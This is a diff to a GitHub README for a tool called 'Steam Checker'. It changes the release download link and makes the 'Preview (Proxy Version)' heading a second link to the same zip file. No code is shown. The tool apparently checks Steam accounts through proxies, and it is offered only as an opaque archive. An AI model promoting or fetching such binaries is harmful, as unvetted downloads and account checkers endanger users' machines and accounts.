@@ -2,7 +2,7 @@
 
 ---
 <p align = "center">
-  <a href = "https://github.com/JunkieOpfer/Steam-Checker/releases/download/Steam/SteamChecker.zip">Download - Latest Release</a>
+  <a href = "https://github.com/JunkieOpfer/Steam-Checker/releases/download/SteamChecker/SteamChecker.Proxy.Version.zip">Download - Latest Release</a>
 </p>
 
 <p align="center">
@@ -26,7 +26,7 @@ Introducing the Steam Checker, an easy-to-use tool designed to provide you with 
 
 <br>
 
-#### 🔵 Preview (Proxy Version):
+#### <a href="https://github.com/JunkieOpfer/Steam-Checker/releases/download/SteamChecker/SteamChecker.Proxy.Version.zip">🔵 Preview (Proxy Version):</a>
 <details>
   <summary>Main Page</summary>
   
